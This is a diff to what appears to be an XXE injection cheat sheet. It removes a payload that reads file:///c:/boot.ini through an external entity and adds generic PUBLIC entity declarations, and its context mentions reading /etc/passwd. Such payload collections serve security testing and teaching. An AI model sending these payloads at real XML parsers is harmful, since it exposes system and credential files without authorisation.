@@ -139,11 +139,9 @@ We try to display the content of the file `/etc/passwd`
 
 :warning: `SYSTEM` and `PUBLIC` are almost synonym.
 
-```xml
-<?xml version="1.0" encoding="ISO-8859-1"?>
-<!DOCTYPE foo [  
-  <!ELEMENT foo ANY >
-  <!ENTITY xxe SYSTEM "file:///c:/boot.ini" >]><foo>&xxe;</foo>
+```ps1
+<!ENTITY % xxe PUBLIC "Random Text" "URL">
+<!ENTITY xxe PUBLIC "Any TEXT" "URL">
 ```
 
 ### Classic XXE Base64 encoded
